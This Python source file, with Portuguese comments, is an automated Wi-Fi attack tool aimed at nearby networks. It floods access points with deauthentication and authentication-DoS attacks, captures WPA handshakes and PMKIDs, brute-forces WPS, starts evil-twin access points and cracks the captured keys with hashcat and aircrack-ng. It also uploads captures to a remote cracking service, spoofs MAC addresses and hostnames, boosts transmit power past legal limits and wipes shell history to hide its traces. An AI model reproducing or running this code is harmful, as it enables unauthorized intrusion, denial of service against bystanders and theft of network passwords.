import subprocess
import os
import time
import csv
import json
import threading
import re
from datetime import datetime

# ==============================================================
# UI MODERNA - GRÃO-MESTRE SUPREMO (ULTIMATE STABLE)
# ==============================================================
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt, IntPrompt, Confirm
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskID, TimeRemainingColumn
    from rich.text import Text
    from rich import print as rprint
except ImportError:
    print("[!] Erro: rich ausente.")
    exit(1)

console = Console()
WEB_CALLBACK = None
AUTOPILOT_ACTIVE = False
BASE_CAP_DIR = "capturas_dsi"

def setup_capture_dir(essid):
    """ Cria o diretório base e a subpasta com o nome da rede (limpo) """
    if not os.path.exists(BASE_CAP_DIR):
        os.makedirs(BASE_CAP_DIR)
        
    # Limpa o ESSID de caracteres perigosos para nome de pasta
    safe_essid = re.sub(r'[^a-zA-Z0-9_\-]', '_', essid)
    if not safe_essid: safe_essid = "RedeOculta"
    
    target_dir = os.path.join(BASE_CAP_DIR, safe_essid)
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)
        
    return target_dir, safe_essid

def supreme_log(msg, log_type="info"):
    if WEB_CALLBACK: WEB_CALLBACK(msg, log_type)
    if log_type == "error": console.print(f"[bold red][!] {msg}[/bold red]")
    elif log_type == "cmd": console.print(f"[bold magenta]>>> {msg}[/bold magenta]")
    else: console.print(f"[bold cyan]{msg}[/bold cyan]")

OUI_DB = {
    "00:25:9C": "TP-Link", "60:E3:27": "TP-Link", "A4:2B:B0": "TP-Link", "18:D6:C7": "TP-Link", "D8:47:32": "TP-Link",
    "00:1D:AA": "SpaceX (Starlink)", "08:EE:8B": "SpaceX (Starlink)", "F0:5C:19": "SpaceX (Starlink)", 
    "2C:33:11": "SpaceX (Starlink)", "B4:FB:E4": "SpaceX (Starlink)", "52:B6:A9": "SpaceX (Starlink)",
    "28:AD:3E": "Huawei", "E4:C7:22": "Huawei", "80:B6:86": "Huawei", "78:1D:4A": "Huawei",
    "00:1F:A3": "Cisco", "C0:25:06": "Cisco", "00:16:B6": "Cisco", "00:0C:42": "MikroTik",
    "FC:22:F4": "Zyxel", "00:E0:4C": "Realtek", "A4:91:B1": "Intelbras"
}

def identify_vendor(bssid):
    prefix = bssid.upper()[:8]
    return OUI_DB.get(prefix, "Desconhecido/Genérico")

def analyze_vulnerabilities(vendor, essid, privacy):
    vulns, advice = [], ""
    injection_works = os.path.exists("/tmp/dsi_injection_ok")
    
    # Detecção Wi-Fi 6 / WPA3
    if "AX" in privacy or "WPA3" in privacy or "SAE" in privacy:
        advice = "ALVO WI-FI 6 (AX): PMF Ativo. Foco em Captura PMKID (hcxdumptool) ou Evil Twin Expert."
    elif "Starlink" in vendor or "Starlink" in essid:
        advice = "ALVO STARLINK: PMF Ativo. Use VETOR X ou PMKID Prolongado."
    elif not injection_works:
        advice = "HARDWARE LIMITADO: Injeção falhou. Use [Vetor A] ou [Vetor F] (Passivos)."
    else: advice = "Alvo vulnerável a todos os ataques clássicos."
    return vulns, advice

def patch_mt7601u(interface):
    supreme_log(f"Aplicando Patch para MT7601U...", log_type="cmd")
    run_command(f"iw dev {interface} set power_save off", sudo=True)
    run_command(f"ip link set {interface} down", sudo=True)
    run_command(f"iw dev {interface} set type monitor", sudo=True)
    run_command(f"ip link set {interface} up", sudo=True)

def test_injection(interface):
    run_command("rm -f /tmp/dsi_injection_ok")
    stdout_usb, _ = run_command("lsusb")
    if "7601" in stdout_usb: patch_mt7601u(interface)
    supreme_log(f"Calibrando Injeção em {interface}...", log_type="cmd")
    run_command(f"iw dev {interface} set channel 6", sudo=True)
    time.sleep(1)
    stdout, _ = run_command(f"aireplay-ng -9 {interface}")
    if stdout and "Injection is working!" in stdout:
        supreme_log("HARDWARE VALIDADO.", log_type="info")
        with open("/tmp/dsi_injection_ok", "w") as f: f.write("ok")
        return True
    supreme_log("HARDWARE LIMITADO.", log_type="error")
    return False

def boost_signal(interface):
    supreme_log("BOOST: Elevando potência do hardware...", log_type="cmd")
    run_command("iw reg set BZ", sudo=True)
    run_command(f"ip link set {interface} down", sudo=True)
    run_command(f"iw dev {interface} set txpower fixed 4000", sudo=True)
    run_command(f"ip link set {interface} up", sudo=True)

def fix_drivers_wifi6(auto_confirm=False):
    supreme_log("Wi-Fi 6 Doctor acionado.", log_type="cmd")
    stdout_usb, _ = run_command("lsusb")
    chipset = None
    if "8852" in stdout_usb: chipset = "RTL8852AU"
    elif "8832" in stdout_usb: chipset = "RTL8832AU"
    elif "7921" in stdout_usb: chipset = "MT7921AU"
    elif "A69C" in stdout_usb.upper(): chipset = "AIC8800"
    if not chipset: return False
    if auto_confirm or Confirm.ask(f"Instalar drivers para {chipset}?"):
        run_command("apt update && apt install -y build-essential git dkms linux-headers-$(uname -r)", sudo=True)
        if "RTL" in chipset:
            run_command("git clone https://github.com/lwfinger/rtl8852au.git /tmp/drv && cd /tmp/drv && make && make install", sudo=True)
        elif chipset == "AIC8800":
            supreme_log("Driver AIC8800 já otimizado via Roo Expert.", log_type="info")
        return True
    return False

def run_command(command, sudo=False, capture_output=True, text=True):
    if sudo: command = "sudo " + command
    try:
        result = subprocess.run(command, shell=True, capture_output=capture_output, text=text, check=True)
        return result.stdout.strip(), result.stderr.strip()
    except: return None, ""

def check_aircrack_ng():
    ferramentas = ["aircrack-ng", "hcxdumptool", "hcxtools", "mdk4", "macchanger", "reaver", "wifite", "dnsmasq", "hostapd"]
    for f in ferramentas:
        stdout, _ = run_command(f"dpkg -s {f}")
        if not (stdout and "install ok installed" in stdout):
            run_command(f"apt update && apt install -y {f}", sudo=True)
    return True

def update_zero_day():
    supreme_log("PROTOCOLO ZERO-DAY ATIVO.", log_type="cmd")
    run_command("apt update -y", sudo=True)
    run_command("git pull origin main")
    supreme_log("ATUALIZADO.")

def set_monitor_mode(interface):
    supreme_log(f"Invocando Monitor em {interface} (Surgical Mode)...", log_type="cmd")
    run_command("rfkill unblock all", sudo=True)
    
    # Desativa gerenciamento apenas para esta interface para preservar internet em outras
    run_command(f"nmcli device set {interface} managed no", sudo=True)
    run_command(f"ip link set {interface} down", sudo=True)
    run_command(f"macchanger -r {interface}", sudo=True)
    
    # Tentativa via iw (mais limpo)
    run_command(f"iw dev {interface} set type monitor", sudo=True)
    run_command(f"ip link set {interface} up", sudo=True)
    
    # Verifica se funcionou
    stdout_iw, _ = run_command("iw dev")
    if f"Interface {interface}" in stdout_iw:
        # Verifica se o tipo é monitor
        lines = stdout_iw.split("\n")
        found = False
        for i, line in enumerate(lines):
            if f"Interface {interface}" in line:
                if i+2 < len(lines) and "type monitor" in lines[i+2]:
                    found = True; break
        if found: return interface

    # Fallback: airmon-ng (menos cirúrgico)
    run_command(f"airmon-ng start {interface}", sudo=True)
    return interface

def set_managed_mode(interface):
    supreme_log(f"HARD RESET: Restaurando {interface}...", log_type="cmd")
    # Para processos que podem estar usando o rádio
    run_command(f"airmon-ng stop {interface}", sudo=True)
    run_command(f"ip link set {interface} down", sudo=True)
    run_command(f"macchanger -p {interface}", sudo=True)
    run_command(f"iw dev {interface} set type managed", sudo=True)
    run_command(f"ip link set {interface} up", sudo=True)
    
    # Reativa no NetworkManager
    run_command(f"nmcli device set {interface} managed yes", sudo=True)
    run_command("nmcli networking on", sudo=True)
    run_command("systemctl start NetworkManager", sudo=True)
    supreme_log(f"Interface {interface} restaurada.", log_type="info")

def capture_vetor_x(monitor_interface, bssid, channel, output_file):
    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
    pcapng = f"{output_file}_vx.pcapng"; hashf = f"{output_file}_vx.16800"
    cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --enable_status=31 --active_beacon --proberequest"
    try:
        proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        time.sleep(60); proc.terminate()
    except: pass
    if os.path.exists(pcapng):
        run_command(f"hcxpcapngtool -o {hashf} {pcapng}")
        if os.path.exists(hashf) and os.path.getsize(hashf) > 0: return hashf
    return None

def capture_pmkid(monitor_interface, bssid, channel, output_file, params=None):
    pcapng = f"{output_file}_pm.pcapng"; hashf = f"{output_file}_pm.16800"
    filtro = "alvo_filtro.txt"
    with open(filtro, "w") as f: f.write(bssid.replace(":", "") + "\n")
    cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --filterlist_ap={filtro} --filtermode=2 --enable_status=15"
    try:
        proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        time.sleep(60); proc.terminate()
    except: pass
    os.remove(filtro)
    if os.path.exists(pcapng):
        run_command(f"hcxpcapngtool -o {hashf} {pcapng}")
        if os.path.exists(hashf) and os.path.getsize(hashf) > 0: return hashf
    return None

def capture_handshake(monitor_interface, bssid, channel, output_file, params=None):
    """ Vetor Y: Obliteração Absoluta (Ataque Multi-Camada MDK4 + Airodump) """
    supreme_log(f"VETOR OBLITERAÇÃO INICIADO EM {bssid} [CH: {channel}]...", log_type="cmd")
    
    # Fixa o canal
    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
    
    # Prepara arquivos
    run_command(f"rm -f {output_file}-01.*", sudo=True)
    cap_file = f"{output_file}-01.cap"
    
    # 1. Inicia o Airodump-ng em background para apenas "escutar e gravar" o tráfego do alvo
    cmd_airodump = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} --output-format pcap {monitor_interface}"
    airodump_proc = subprocess.Popen(cmd_airodump, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    handshake_found = False
    escalation_level = 1
    
    # Loop de obliteração de 120 segundos (Ataques escalonados)
    for i in range(12):
        if escalation_level == 1:
            supreme_log("NÍVEL 1: Deauth Massivo (Amok Mode) via mdk4...", log_type="cmd")
            # MDK4 Deauth Mode (Desconecta todo mundo brutalmente)
            cmd_mdk = f"sudo mdk4 {monitor_interface} d -B {bssid} -c {channel}"
            mdk_proc = subprocess.Popen(cmd_mdk, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(10)
            mdk_proc.terminate()
            escalation_level = 2
            
        elif escalation_level == 2:
            supreme_log("NÍVEL 2: Sobrecarga de Autenticação (Auth DoS) para travar roteador...", log_type="cmd")
            # MDK4 Auth Mode (Cria milhares de clientes falsos, forçando o roteador a derrubar os reais)
            cmd_mdk = f"sudo mdk4 {monitor_interface} a -a {bssid} -m"
            mdk_proc = subprocess.Popen(cmd_mdk, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(10)
            mdk_proc.terminate()
            escalation_level = 3
            
        elif escalation_level == 3:
            supreme_log("NÍVEL 3: WPA Downgrade (Michael Shutdown Exploitation)...", log_type="cmd")
            # MDK4 WPA Downgrade (Força o AP a desligar o Wi-Fi por 1 minuto por 'segurança')
            cmd_mdk = f"sudo mdk4 {monitor_interface} m -t {bssid}"
            mdk_proc = subprocess.Popen(cmd_mdk, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(10)
            mdk_proc.terminate()
            escalation_level = 1 # Volta pro nível 1
            
        # Verificação Contínua a cada ciclo de 10s
        run_command("sudo killall mdk4 2>/dev/null") # Garante limpeza de zumbis
        
        if os.path.exists(cap_file) and os.path.getsize(cap_file) > 2000: # Se o ficheiro tem tráfego real
            stdout, _ = run_command(f"aircrack-ng -q {cap_file}")
            if stdout and ("1 handshake" in stdout or "WPA (1 handshake)" in stdout):
                supreme_log("!!! SUCESSO ABSOLUTO: Handshake EAPOL capturado durante a obliteração!", log_type="info")
                handshake_found = True
                break
                
    # Finaliza a escuta
    airodump_proc.terminate()
    run_command("sudo killall airodump-ng mdk4 2>/dev/null")
    
    if handshake_found:
        return cap_file
    else:
        supreme_log("FALHA: O roteador resistiu aos 3 níveis de DoS (Provavelmente PMF estrito ou ausência total de clientes reais ativos).", log_type="error")
        # Se falhou, elimina o lixo para não poluir a pasta e falsificar quebras
        os.remove(cap_file)
        return None

def capture_wps(monitor_interface, bssid, channel, params=None):
    cmd = f"sudo reaver -i {monitor_interface} -b {bssid} -c {channel} -K 1 -vv -f"
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
        return "WPS PIN" in res.stdout
    except: return False

def start_ghost_attack(interface, essid):
    run_command(f"sudo mdk4 {interface} b -n \"{essid}\" -g -m", sudo=True)

def start_wifite_expert(interface):
    subprocess.run(f"sudo wifite -i {interface} --kill", shell=True)

def start_evil_twin(interface, essid):
    from dsi_twin import DSITwin
    twin = DSITwin(interface, essid)
    twin.generate_configs()
    twin.start(log_callback=WEB_CALLBACK)
    return "EVIL_TWIN_STARTED"

def apply_stealth_mode(interface):
    """ Protocolo Stealth v2: Ofuscação de Identidade """
    vendors = ["Apple", "Samsung", "Google", "Microsoft", "Intel"]
    hostnames = ["Workstation-PC", "iPhone-de-Usuario", "Android-Global", "Surface-Laptop", "Dell-XPS-Admin"]
    
    selected_vendor = vendors[int(time.time()) % len(vendors)]
    selected_host = hostnames[int(time.time()) % len(hostnames)]
    
    supreme_log(f"STEALTH: Assumindo identidade {selected_vendor} ({selected_host})...", log_type="cmd")
    
    # Muda Hostname
    run_command(f"hostnamectl set-hostname {selected_host}", sudo=True)
    
    # Muda MAC de forma inteligente (respeitando OUIs conhecidos)
    if selected_vendor == "Apple": ouis = ["00:03:93", "00:05:02", "00:0A:27"]
    elif selected_vendor == "Samsung": ouis = ["00:00:F0", "00:07:AB", "00:12:47"]
    else: ouis = ["00:0C:29", "00:50:56"] # VMWare/Intel
    
    prefix = ouis[int(time.time()) % len(ouis)]
    run_command(f"ip link set {interface} down", sudo=True)
    run_command(f"macchanger -m {prefix}:{(int(time.time()) % 89 + 10):02}:{(int(time.time()*2) % 89 + 10):02}:{(int(time.time()*3) % 89 + 10):02} {interface}", sudo=True)
    run_command(f"ip link set {interface} up", sudo=True)

class DSIOrchestrator:
    """ Orquestrador de Vetores Simultâneos v7.0 """
    def __init__(self, interface, target):
        self.interface = interface
        self.target = target
        self.success_event = threading.Event()
        self.captured_file = None
        self.threads = []

    def _run_vector(self, func, *args):
        res = func(*args)
        if res:
            self.captured_file = res
            self.success_event.set()

    def launch_concurrent_assault(self):
        prefix = f"elite"
        apply_stealth_mode(self.interface)
        
        supreme_log(f"LANÇANDO ATAQUE MULTI-VETOR EM {self.target['essid']}...", log_type="cmd")
        
        # Inicia Captura Passiva e Ativa simultaneamente
        v1 = threading.Thread(target=self._run_vector, args=(capture_pmkid, self.interface, self.target['bssid'], self.target['channel'], prefix, None, self.target['essid']))
        v2 = threading.Thread(target=self._run_vector, args=(capture_vetor_x, self.interface, self.target['bssid'], self.target['channel'], prefix, self.target['essid']))
        
        self.threads = [v1, v2]
        for t in self.threads: t.start()
        
        # Espera até 90 segundos por qualquer sucesso
        self.success_event.wait(timeout=90)
        
        if self.success_event.is_set():
            supreme_log(f"VETOR VENCEDOR DETECTADO: {self.captured_file}", log_type="info")
            return self.captured_file
        
        supreme_log("Orquestrador: Alvo resistiu ao ataque simultâneo. Escalando agressividade...", log_type="error")
        return None

def run_autopilot(interface, target):
    global AUTOPILOT_ACTIVE
    from dsi_ai import DSIAI
    brain = DSIAI(); AUTOPILOT_ACTIVE = True; prefix = f"capture"; hw_ok = os.path.exists("/tmp/dsi_injection_ok")
    
    orchestrator = DSIOrchestrator(interface, target)
    
    while AUTOPILOT_ACTIVE:
        # Primeiro tenta o assalto multi-vetor de elite
        cap = orchestrator.launch_concurrent_assault()
        if cap:
            brain.learn(target['bssid'], target['essid'], 'orchestrator', True)
            return cap
        
        # Se falhar, segue com vetores individuais escalonados pela IA
        atk, par = brain.suggest_next_attack(target['bssid'], hw_injection_ok=hw_ok, target=target)
        supreme_log(f"IA ESCALATION: {atk.upper()}")
        
        cap = None
        if atk == 'pmkid': cap = capture_pmkid(interface, target['bssid'], target['channel'], prefix, par, target['essid'])
        elif atk == 'pmkid_v6': cap = capture_pmkid_v6(interface, target['bssid'], target['channel'], prefix, target['essid'])
        elif atk == 'handshake': cap = capture_handshake(interface, target['bssid'], target['channel'], prefix, par, target['essid'])
        elif atk == 'vetorx': cap = capture_vetor_x(interface, target['bssid'], target['channel'], prefix, target['essid'])
        elif atk == 'wps':
            if capture_wps(interface, target['bssid'], target['channel'], par): 
                brain.learn(target['bssid'], target['essid'], 'wps', True); return "WPS_SUCCESS"
        elif atk == 'eviltwin': 
            start_evil_twin(interface, target['essid']); return "EVIL_TWIN_STARTED"
            
        if cap: 
            brain.learn(target['bssid'], target['essid'], atk, True); return cap
        else: 
            brain.learn(target['bssid'], target['essid'], atk, False)
            
        if not AUTOPILOT_ACTIVE: break
        time.sleep(2)
    return None

def scan_networks(monitor_interface):
    boost_signal(monitor_interface)
    output_prefix = "scan_results"
    run_command(f"rm -f {output_prefix}-01.*")
    cmd = f"sudo airodump-ng --band abg --update 1 --manufacturer --output-format csv -w {output_prefix} {monitor_interface}"
    try: subprocess.run(cmd, shell=True)
    except: pass
    networks = []
    csv_file = f"{output_prefix}-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            reader = csv.reader(f); in_ap = False
            for row in reader:
                if not row or len(row) < 14: continue
                if row[0].strip() == "BSSID": in_ap = True; continue
                if in_ap and not row[0].strip() == "Station MAC":
                    bssid = row[0].strip(); essid = row[13].strip()
                    name = essid if (essid and essid != "\x00") else f"<Oculta: {bssid[-5:]}>"
                    networks.append({'bssid': bssid, 'channel': row[3].strip(), 'privacy': row[5].strip(), 'essid': name, 'vendor': identify_vendor(bssid), 'signal': row[8].strip()})
                elif row[0].strip() == "Station MAC": break
    return networks

def get_wifi_interface():
    interfaces = []
    stdout, _ = run_command("iw dev")
    if not stdout:
        # Fallback para ip link se iw falhar
        stdout_ip, _ = run_command("ip -o link show")
        if stdout_ip:
            for line in stdout_ip.split('\n'):
                if "wlan" in line:
                    name = line.split(': ')[1].split()[0]
                    interfaces.append({"name": name, "phy": "N/A", "type": "managed", "ap_support": False, "wifi6": False})
        return interfaces

    blocks = stdout.split('phy#')
    for b in blocks[1:]:
        try:
            lines = [l.strip() for l in b.split('\n') if l.strip()]
            if not lines: continue
            phy_num = lines[0]
            phy = f"phy{phy_num}"
            for l in lines:
                if l.startswith("Interface"):
                    name = l.split()[1]
                    info, _ = run_command(f"iw dev {name} info")
                    pinfo, _ = run_command(f"iw phy {phy} info")
                    is_wifi6 = "802.11ax" in pinfo
                    interfaces.append({
                        "name": name, 
                        "phy": phy, 
                        "type": "monitor" if "type monitor" in info else "managed", 
                        "ap_support": "AP" in pinfo or "AP/VLAN" in pinfo, 
                        "wifi6": is_wifi6
                    })
        except Exception as e:
            print(f"Erro ao parsear interface: {e}")
            continue
    return interfaces

def upload_to_wpa_sec(pcap_file):
    """ Upload de Handshake para Nuvem (WPA-SEC) """
    if not os.path.exists(pcap_file): return False
    supreme_log("MAGISTRADO CLOUD: Enviando Handshake para farm de GPUs remota...", log_type="cmd")
    
    # WPA-SEC API Endpoint
    url = "https://wpa-sec.stanev.org/?api&upload"
    try:
        # Nota: WPA-SEC requer o arquivo em formato pcap ou pcapng
        with open(pcap_file, 'rb') as f:
            files = {'file': f}
            res = requests.post(url, files=files, timeout=30)
            if res.status_code == 200:
                supreme_log("MAGISTRADO CLOUD: Handshake em processamento na Nuvem.", log_type="info")
                return True
    except: pass
    return False

def crack_hash_v7_expert(hash_file, bssid=None):
    """ Módulo de Cracking Elite: Hashcat com Inteligência de Padrões e Regras """
    if not os.path.exists(hash_file): return
    
    # Extrai ESSID do nome do arquivo para log
    essid_match = re.search(r"capture_([^_]+)", os.path.basename(hash_file))
    essid = essid_match.group(1) if essid_match else "Rede Desconhecida"

    # Validação rigorosa do arquivo .cap (Handshakes clássicos)
    if hash_file.endswith(".cap"):
        res, _ = run_command(f"aircrack-ng {hash_file}")
        if res and ("1 handshake" not in res and "WPA (1 handshake)" not in res and "WPA (0 handshake)" in res):
            supreme_log(f"CRACKER [AUTO-CLEAN]: O arquivo {hash_file} é lixo (sem handshakes). Eliminando rasto...", log_type="error")
            os.remove(hash_file)
            return None

    # Validação rigorosa do arquivo .16800 (PMKID)
    if hash_file.endswith(".16800"):
        if os.path.getsize(hash_file) < 10:  # PMKIDs válidos têm sempre mais de 10 bytes. Ficheiros vazios são lixo.
            supreme_log(f"CRACKER [AUTO-CLEAN]: O arquivo PMKID {hash_file} está vazio/inválido (lixo). Eliminando rasto...", log_type="error")
            os.remove(hash_file)
            pcapng_associated = hash_file.replace(".16800", ".pcapng")
            if os.path.exists(pcapng_associated):
                os.remove(pcapng_associated)
                supreme_log(f"CRACKER [AUTO-CLEAN]: Arquivo de captura bruta {pcapng_associated} também eliminado.", log_type="error")
            return None

    # Upload para Nuvem em paralelo (desabilitado se for lixo)
    threading.Thread(target=upload_to_wpa_sec, args=(hash_file,), daemon=True).start()
    
    # 1. Usa a Wordlist CV Master como prioridade, falha para rockyou ou default
    wordlist = "cv_wordlist_elite.txt"
    if not os.path.exists(wordlist):
        wordlist = "/usr/share/wordlists/rockyou.txt"
    if not os.path.exists(wordlist):
        wordlist = "/tmp/dsi_expert.txt"
        with open(wordlist, "w") as f: f.write("12345678\npassword\nadmin123\n")
        
    supreme_log(f"CRACKER: Iniciando Operação de Inteligência em {essid} usando wordlist local...", log_type="cmd")
    
    # 2. Ataque de Dicionário + Regras
    if hash_file.endswith(".16800"):
        cmd_rules = f"hashcat -m 16800 -a 0 {hash_file} {wordlist} -r /usr/share/hashcat/rules/best64.rule --force"
        subprocess.run(cmd_rules, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        # Aircrack tem uma saída mais direta para capturar
        cmd_dict = f"aircrack-ng -w {wordlist} -b {bssid} {hash_file}"
        res, _ = run_command(cmd_dict)
        if res and "KEY FOUND!" in res:
            password = re.search(r"\[\s*(.*)\s*\]", res)
            if password:
                found_pass = password.group(1)
                supreme_log(f"!!! SENHA ENCONTRADA (Aircrack): {essid} -> {found_pass}", log_type="error")
                with open("cracked_passwords.txt", "a") as f: f.write(f"{essid}:{found_pass}\n")
                return found_pass

    # 3. Ataques de Máscara (só para hashcat)
    if hash_file.endswith(".16800"):
        # Verifica se já foi quebrado pelo ataque de regras
        res, _ = run_command(f"hashcat -m 16800 {hash_file} --show")
        if res and ":" in res:
            found_pass = res.split(":")[-1]
            supreme_log(f"!!! SENHA ENCONTRADA (Dicionário CV): {essid} -> {found_pass}", log_type="error")
            with open("cracked_passwords.txt", "a") as f: f.write(f"{essid}:{found_pass}\n")
            return found_pass
            
        masks = ["?d?d?d?d?d?d?d?d", "?u?l?l?l?l?d?d?d", "202?d?d?d?d"]
        for mask in masks:
            supreme_log(f"CRACKER: Testando Máscara Cega (Força Bruta Parcial): {mask} em {essid}...", log_type="cmd")
            cmd_mask = f"hashcat -m 16800 -a 3 {hash_file} {mask} --force"
            subprocess.run(cmd_mask, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            res, _ = run_command(f"hashcat -m 16800 {hash_file} --show")
            if res and ":" in res: 
                found_pass = res.split(":")[-1]
                supreme_log(f"!!! SENHA ENCONTRADA (Máscara Matemática): {essid} -> {found_pass}", log_type="error")
                with open("cracked_passwords.txt", "a") as f: f.write(f"{essid}:{found_pass}\n")
                return found_pass
                
    supreme_log(f"CRACKER: A senha de {essid} não foi encontrada nos dicionários/máscaras locais. Processamento movido para Nuvem.", log_type="error")
    return None
def scan_and_crack_all():
    """ Inteligência Nato: Varre o workspace e tenta quebrar TUDO o que encontrar """
    supreme_log(f"MAGISTRADO: Iniciando varredura profunda na pasta {BASE_CAP_DIR}...", log_type="cmd")
    
    if not os.path.exists(BASE_CAP_DIR):
        supreme_log("Nenhum diretório de capturas encontrado.", log_type="error")
        return

    caps = []
    hashes = []
    
    # Varre recursivamente a pasta de capturas
    for root, _, files in os.walk(BASE_CAP_DIR):
        for f in files:
            full_path = os.path.join(root, f)
            if f.endswith(".cap"): caps.append(full_path)
            elif f.endswith(".16800"): hashes.append(full_path)
            
    # Também checa na raiz caso haja capturas antigas
    for f in os.listdir("."):
        if f.endswith(".cap"): caps.append(f)
        elif f.endswith(".16800"): hashes.append(f)
    
    total = len(caps) + len(hashes)
    if total == 0:
        supreme_log("Nenhum arquivo de captura encontrado para processar.", log_type="error")
        return
    
    supreme_log(f"Encontrados {total} arquivos de captura. Iniciando quebra em massa...", log_type="info")
    
    for h in hashes: crack_hash_v7_expert(h)
    for c in caps: crack_hash_v7_expert(c)
    supreme_log("Quebra em massa concluída.", log_type="info")

def crack_hash(hash_file, wordlist_file, bssid=None):
    crack_hash_v7_expert(hash_file, bssid)

def capture_pmkid_v6(monitor_interface, bssid, channel, output_file, essid="Desconhecido"):
    supreme_log(f"Iniciando Captura PMKID Otimizada para Wi-Fi 6 em {bssid}...", log_type="cmd")
    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
    
    target_dir, safe_essid = setup_capture_dir(essid)
    base_name = os.path.join(target_dir, f"{output_file}_{safe_essid}")
    
    pcapng = f"{base_name}_ax.pcapng"; hashf = f"{base_name}_ax.16800"
    
    # hcxdumptool v6+ usa comandos diferentes
    cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --enable_status=15 --active_beacon"
    try:
        proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        # Wi-Fi 6 pode demorar mais para soltar o PMKID
        time.sleep(120); proc.terminate()
    except: pass
    if os.path.exists(pcapng):
        run_command(f"hcxpcapngtool -o {hashf} {pcapng}")
        if os.path.exists(hashf) and os.path.getsize(hashf) > 0: 
            supreme_log("PMKID CAPTURADO COM SUCESSO (Vetor AX).", log_type="info")
            return hashf
    return None

def auto_cleanup():
    """ Protocolo de Limpeza Expert: Remoção de rastros e logs temporários """
    supreme_log("AUTO-CLEANUP: Higienizando sistema e removendo pegadas (arquivos de scan)...", log_type="cmd")
    
    # 1. Remove APENAS arquivos de scan temporários, preservando a pasta 'capturas_dsi'
    run_command("rm -f web_scan_results-01.* scan_results-01.*", sudo=True)
    
    # 2. Limpa histórico do Bash (apenas comandos desta ferramenta)
    run_command("history -c", sudo=True)
    
    # 3. Reseta interfaces
    interfaces = get_wifi_interface()
    for iface in interfaces:
        set_managed_mode(iface['name'])
        
    supreme_log("SISTEMA HIGIENIZADO. Operação concluída.", log_type="info")

def main(): 
    # Chama limpeza ao sair
    import atexit
    atexit.register(auto_cleanup)

if __name__ == "__main__": main()
